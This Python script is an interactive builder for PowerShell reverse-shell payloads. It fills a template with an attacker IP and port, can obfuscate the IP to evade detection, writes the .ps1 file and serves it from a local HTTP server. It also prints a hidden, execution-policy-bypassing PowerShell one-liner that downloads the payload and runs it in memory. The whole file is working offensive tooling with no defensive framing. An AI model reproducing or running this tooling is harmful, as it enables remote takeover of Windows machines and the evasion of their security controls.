
import random,socket,re,os,http.server,sys

class PowershellReverseShell:
    def __init__(self):
        self.reset_color = "\033[0m"
        self.bold_text = "\033[1m"
        self.red_color = "\033[31m"
        self.yellow_color = "\033[33m"
        self.green_color = "\033[32m"

    #logo
    def logo(self):
        return f"""{self.red_color}
░█████████    ░██████   ░█████████    ░██████   
░██     ░██  ░██   ░██  ░██     ░██  ░██   ░██  
░██     ░██ ░██         ░██     ░██ ░██         
░█████████   ░████████  ░█████████   ░████████  
░██   ░██           ░██ ░██                 ░██ 
░██    ░██   ░██   ░██  ░██          ░██   ░██  
░██     ░██   ░██████   ░██           ░██████   
                                  
-----------------------------------------------
{self.bold_text}    Reverse Shell Power Shell
-----------------------------------------------{self.reset_color}
        """

    #obfuscate String
    def obfuscate_string(self,input_str):
        if not input_str:
            return "", 0
        
        # Find the last block (e.g., the '125' in '192.168.29.125')
        # If there's a dot, we split on the last dot to isolate the number for math obfuscation
        if '.' in input_str:
            base_part, math_part = input_str.rsplit('.', 1)
            base_part += '.'  # Re-add the trailing dot to the string portion
        else:
            # Fallback if it's not an IP: split at the last character
            base_part, math_part = input_str[:-1], input_str[-1:]

        # 1. Obfuscate the base string into $[char]0xXX format
        char_blocks = []
        for char in base_part:
            hex_val = hex(ord(char)).upper().replace("0X", "0x")
            char_blocks.append(f"$([char]{hex_val})")
        
        char_string = "".join(char_blocks)

        # 2. Obfuscate the last part using modulo arithmetic if it's a number
        if math_part.isdigit():
            target_num = int(math_part)
            # Generate a random divisor greater than the target number
            divisor = random.randint(target_num + 1, target_num + 200)
            # Calculate a multiple that, when added to the target, creates our large number
            multiplier = random.randint(3, 10)
            large_num = (divisor * multiplier) + target_num
            
            math_string = f"$({large_num} % {divisor})"
        else:
            # Fallback if the trailing character isn't a number
            hex_val = hex(ord(math_part)).upper().replace("0X", "0x")
            math_string = f"$([char]{hex_val})"

        # Combine them into the final PowerShell string concatenation
        powershell_line = f'("{char_string}" + {math_string})'
        return powershell_line
    
    #get available IP address
    def get_my_available_ip(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            # 8.8.8.8 is Google DNS, but no data is actually sent over the network
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            return ip
        except Exception:
            # Fallback to local loopback if the machine is entirely offline
            return False
        finally:
            s.close()

    #check valid ip address
    def check_valid_ip_address(self,ip_address):
        ip_pattern = r"^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
        if re.match(ip_pattern,ip_address):
            return True
        else:
            return False
        
    #check valid port number
    def check_valid_port(self,port):
        port_pattern = r"^(?:[1-9][0-9]{0,3}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$"
        if re.match(port_pattern,port):
            return True
        else:
            return False
    
    #read powershell file content (format)
    def read_powershell_model_from_res(self,file_name):
        script_dir = os.path.dirname(os.path.abspath(__file__))
        model_file_path  = os.path.join(script_dir, "res", file_name)
        try:
            with open(model_file_path,"r",encoding="utf-8") as file:
                return file.read()
            
        except FileNotFoundError:
            print(f"{self.red_color}[X] File '{file_name}' Not found.{self.reset_color}")
            return False
        except Exception as e:
            print(f"{self.red_color}[X]Error Occured Reading File: {e}{self.reset_color}")

    #write modified content
    def write_content_to_powershell_file(self,content,file_name):
        script_dir = os.path.dirname(os.path.abspath(__file__))
        new_ps1_file_path  = os.path.join(script_dir, f"{file_name}.ps1")
        try:
            with open(new_ps1_file_path,"w",encoding="utf-8") as newps1File:
                newps1File.write(content)
                print(f"{self.green_color}[+] Created File {file_name}.ps1\nLocation:{new_ps1_file_path}{self.reset_color}") 
                return True
            
        except Exception as e:
            print(f"{self.red_color}[X] Error Writing New File : {e}{self.reset_color}")
            return False
        
    #host file
    def host_file(self,file_name,port):
        ip = self.get_my_available_ip()
        if ip!=False:
            print(f"[+]Available on :  http://{ip}:{port}/{file_name}.ps1")
            print(f"\n[+]QUick Execute Code (hidden/run in memmory) :\n\n{self.yellow_color} powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \"iex (New-Object net.WebClient).DownloadString('http://{ip}:{port}/{file_name}.ps1')\"{self.reset_color}\n")
        else:
            print(f"{self.red_color}[X]Could'nt List Ip address{self.reset_color}")

        #spawn http server
        try:
            handler = http.server.SimpleHTTPRequestHandler
            server_address = ('0.0.0.0', port)
            httpd = http.server.ThreadingHTTPServer(server_address, handler)
            print(f"{self.green_color}[+] Server successfully running on port {port}...{self.reset_color}")
            print(f"{self.green_color}[!] Press CTRL+C to stop hosting.{self.reset_color}")
            httpd.serve_forever()

        except KeyboardInterrupt:
            print(f"\n{self.green_color}[-] Server stopped cleanly by user.{self.reset_color}")
            httpd.server_close()
        
        except Exception as e:
            print(f"[X] Server failed to start: {e}")

    #start
    def start(self):
        #show logo
        print(self.logo())

        #get server ip address 
        default_ip = self.get_my_available_ip()
        server_ip = input(f"Enter Server IP {self.yellow_color}[default={default_ip}]: {self.reset_color} ")
        if self.check_valid_ip_address(server_ip)==False:
            print(f"{self.green_color}[X] Invalid IP Address Found! Ip defaulted to {default_ip} {self.reset_color}")
            server_ip = default_ip

        #get server port
        default_port = "4444"
        server_port = input(f"Enter Server Port {self.yellow_color}[default={default_port}]: {self.reset_color}")
        if self.check_valid_port(server_port)==False:
            print(f"{self.green_color}[X] Invalid Port Number Found! Port defaulted to {default_port} {self.reset_color} ")
            server_port = default_port

        #get file name
        default_filename = "test"
        filename = input(f"Enter Name of the New File {self.yellow_color}[default={default_filename}] : {self.reset_color}")
        if filename=="":
            filename = default_filename
            print(f"{self.green_color}[X] Filename not specified! Filename Defaulted to '{default_filename}' {self.reset_color}")

        #obfuscation option
        format_model = "nobf_backup.txt"
        obfuscation = False
        enable_obfuscation = input(f"Enable Obfuscation [y/n] {self.yellow_color}[default=n] : {self.reset_color}")
        if enable_obfuscation == "y":
            format_model = "obf_backup.txt"
            print(f"{self.green_color}[+]Obfuscation Enabled{self.reset_color}")
            obfuscation=True
        else:
            print(f"{self.green_color}[+]Obfuscation Disabled{self.reset_color}")
            obfuscation=False

        #generate powershell file
        #read
        powershell_file_content = self.read_powershell_model_from_res(format_model)
        #set obfuscated ip for obfuscated format
        if obfuscation==True:
            powershell_file_content = powershell_file_content.replace("IP_ADD",self.obfuscate_string(server_ip))
        #set obfuscated ip for non-obfuscated format
        else:
            powershell_file_content = powershell_file_content.replace("IP_ADD",server_ip)
        #set port
        powershell_file_content = powershell_file_content.replace("PORT",server_port)

        #write
        self.write_content_to_powershell_file(powershell_file_content,filename)

        #enable hosting
        hosting = False
        hosting_default_port = 8080
        enable_hosting = input(f"File Generated! Host the File? [y/n] {self.yellow_color}[default=n] : {self.reset_color}")
        hosting_port=0
        
        if enable_hosting== "y":
            try:
                hosting_port = int(input(f"Enter port to host the File {self.yellow_color}[default=8080] : {self.reset_color}"))
                if not self.check_valid_port(str(hosting_port))==True:
                    hosting_port = hosting_default_port
            except ValueError:
                print(f"{self.green_color}[X] Invalid Port! Port Defaulted into {hosting_default_port}{self.reset_color} ")
                hosting_port = hosting_default_port
            hosting = True
        
        #hosting
        if hosting ==True:
            self.host_file(file_name=filename,port=hosting_port)

main = PowershellReverseShell()
try:
    main.start()
except KeyboardInterrupt:
    print("\n")
    sys.exit()